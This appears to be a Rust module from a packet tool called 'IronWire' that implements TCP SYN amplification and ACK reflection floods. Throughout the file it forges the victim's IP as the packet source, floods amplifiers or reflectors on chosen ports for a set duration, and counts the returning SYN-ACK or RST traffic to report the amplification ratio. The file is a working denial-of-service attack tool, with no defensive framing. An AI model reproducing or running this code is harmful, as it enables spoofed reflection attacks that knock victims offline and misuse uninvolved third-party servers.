/// IronWire — TCP Amplification & ACK Reflection
///
/// Sends spoofed TCP SYN packets to amplifiers with the victim's
/// source IP, then measures the amplification factor from SYN-ACK
/// or RST responses.

use std::io::Write;
use std::net::Ipv4Addr;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64,
                     Ordering
                     };
use std::time::Duration;

use rand::Rng;
use pnet::packet::tcp::
            {
                TcpFlags, TcpPacket
            };
use pnet::packet::Packet;
use pnet::util::MacAddr;

use crate::session::{self, PacketStats};
use crate::profile;

/// Tracks amplification statistics including bytes in/out for ratio calculation.
pub struct AmpStats {
    pub total_sent: Arc<AtomicU64>,
    pub total_recv: Arc<AtomicU64>,
    pub bytes_out: Arc<AtomicU64>,
    pub bytes_in: Arc<AtomicU64>,
}

impl AmpStats {
    /// Creates a new `AmpStats` with all counters at zero.
    pub fn new() -> Self {
        Self {
            total_sent: Arc::new(AtomicU64::new(0)),
            total_recv: Arc::new(AtomicU64::new(0)),
             bytes_out: Arc::new(AtomicU64::new(0)),
             bytes_in: Arc::new(AtomicU64::new(0)),
        }
    }

    /// Returns the amplification factor (bytes in / bytes out).
    pub fn amplification_factor(&self) -> f64 {
        let out = self.bytes_out.load(Ordering::Relaxed);
        let inp = self.bytes_in.load(Ordering::Relaxed);
        if out == 0 { return 0.0 }
        inp as f64 / out as f64
    }
}

/// Core flood loop: sends packets and reports live statistics.
async fn run_flood_loop(
    iface: &str,
    src_mac: MacAddr, dst_mac: MacAddr,
    target_ip: Ipv4Addr, victim_ip: Ipv4Addr,
    ports: &[u16],
    flags: u8,
    duration: u64, delay_ms: u64,
    stats: Arc<PacketStats>,
    amp_stats: &AmpStats,
    label: &str,
    pkt_size: u64,
) {
    let mut tx = match session::open_datalink(iface, 100) {
        Some((tx, _rx)) => { drop(_rx); tx }
        None => { tracing::error!("datalink channel: {}", iface); return; }
    };

    let deadline = std::time::Instant::now() + Duration::from_secs(duration);

    while std::time::Instant::now() < deadline {
        let a_port = ports[rand::thread_rng().gen_range(0..ports.len())];
        let r_port = profile::random_port();

        let pkt = session::build_tcp_packet(victim_ip, target_ip, r_port, a_port, flags, src_mac, dst_mac, true);
        match tx.send_to(&pkt, None) {
            Some(Ok(_)) => {
                stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                amp_stats.total_sent.fetch_add(1, Ordering::Relaxed);
                amp_stats.bytes_out.fetch_add(pkt_size, Ordering::Relaxed);
            }
            _ => { stats.packets_failed.fetch_add(1, Ordering::Relaxed); }
        }

        if delay_ms > 0 { tokio::time::sleep(Duration::from_millis(delay_ms)).await; }

        let sent = stats.packets_sent.load(Ordering::Relaxed);
        let fail = stats.packets_failed.load(Ordering::Relaxed);
        let responses = amp_stats.total_recv.load(Ordering::Relaxed);
        let amp = amp_stats.amplification_factor();
        print!("\r{} -> sent: {} | drop: {} | resp: {} | amp: {:.2}x", label, sent, fail, responses, amp);
        let _ = std::io::stdout().flush();
    }
    println!();
}

/// Runs TCP SYN amplification: sends SYN with victim source IP to amplifiers,
/// and counts returning SYN-ACKs from the target.
pub async fn run_tcp_amplify(
    iface: &str,
    src_mac: MacAddr,
    _src_ip: Ipv4Addr,
    dst_mac: MacAddr,
    target_ip: Ipv4Addr,
    victim_ip: Ipv4Addr,
    amplify_ports: &[u16],
    duration: u64,
    delay_ms: u64,
    stats: Arc<PacketStats>,
) -> AmpStats {
    let amp_stats = AmpStats::new();

    // Listener thread: captures SYN-ACK packets from the target
    let (_, mut rx) = match session::open_datalink(iface, 100) {
        Some((tx, rx)) => (tx, rx),
        None => { return amp_stats; }
    };

    let amp_recv = Arc::clone(&amp_stats.total_recv);
    let amp_bytes_in = Arc::clone(&amp_stats.bytes_in);
    let t_ip = target_ip;

    tokio::task::spawn_blocking(move || {
        use pnet::packet::ipv4::Ipv4Packet;
        use pnet::packet::ethernet::EthernetPacket;
        use pnet::packet::ip::IpNextHeaderProtocols;
        let start = std::time::Instant::now();
        while start.elapsed() < Duration::from_secs(duration + 10) {
            match rx.next() {
                Ok(frame) => {
                    if let Some(eth) = EthernetPacket::new(&frame) {
                        if eth.get_ethertype() != pnet::packet::ethernet::EtherTypes::Ipv4 { continue; }
                        if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                            if ip.get_source() != t_ip { continue; }
                            if ip.get_next_level_protocol() != IpNextHeaderProtocols::Tcp { continue; }
                            if let Some(tcp) = TcpPacket::new(ip.payload()) {
                                if (tcp.get_flags() & TcpFlags::SYN) != 0 && (tcp.get_flags() & TcpFlags::ACK) != 0 {
                                    amp_recv.fetch_add(1, Ordering::Relaxed);
                                    amp_bytes_in.fetch_add(frame.len() as u64, Ordering::Relaxed);
                                }
                            }
                        }
                    }
                }
                Err(_) => {}
            }
        }
    });

    run_flood_loop(
        iface, src_mac, dst_mac, target_ip, victim_ip, amplify_ports,
        TcpFlags::SYN, duration, delay_ms, stats, &amp_stats, "amplify", 54,
    ).await;

    amp_stats
}

/// Runs ACK reflection amplification: sends ACK packets with victim source IP
/// to reflectors, counting returning RST packets.
pub async fn run_ack_reflection_amplify(
    iface: &str,
    src_mac: MacAddr,
    _src_ip: Ipv4Addr,
    dst_mac: MacAddr,
    target_ip: Ipv4Addr,
    victim_ip: Ipv4Addr,
    reflect_ports: &[u16],
    duration: u64,
    delay_ms: u64,
    stats: Arc<PacketStats>,
) -> AmpStats {
    let amp_stats = AmpStats::new();

    let mut rx = match session::open_datalink(iface, 100) {
        Some((_tx, rx)) => rx,
        None => { return amp_stats; }
    };

    let amp_recv = Arc::clone(&amp_stats.total_recv);
    let amp_bytes_in = Arc::clone(&amp_stats.bytes_in);

    // Listener thread: captures RST packets from reflectors
    tokio::task::spawn_blocking(move || {
        use pnet::packet::ipv4::Ipv4Packet;
        use pnet::packet::ethernet::EthernetPacket;
        use pnet::packet::ip::IpNextHeaderProtocols;
        let start = std::time::Instant::now();
        while start.elapsed() < Duration::from_secs(duration + 10) {
            match rx.next() {
                Ok(frame) => {
                    if let Some(eth) = EthernetPacket::new(&frame) {
                        if eth.get_ethertype() != pnet::packet::ethernet::EtherTypes::Ipv4 { continue; }
                        if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                            if ip.get_next_level_protocol() != IpNextHeaderProtocols::Tcp { continue; }
                            if let Some(tcp) = TcpPacket::new(ip.payload()) {
                                if (tcp.get_flags() & TcpFlags::RST) != 0 {
                                    amp_recv.fetch_add(1, Ordering::Relaxed);
                                    amp_bytes_in.fetch_add(frame.len() as u64, Ordering::Relaxed);
                                }
                            }
                        }
                    }
                }
                Err(_) => {}
            }
        }
    });

    run_flood_loop(
        iface, src_mac, dst_mac, target_ip, victim_ip, reflect_ports,
        TcpFlags::ACK, duration, delay_ms, stats, &amp_stats, "ack-reflect", 54,
    ).await;

    amp_stats
}
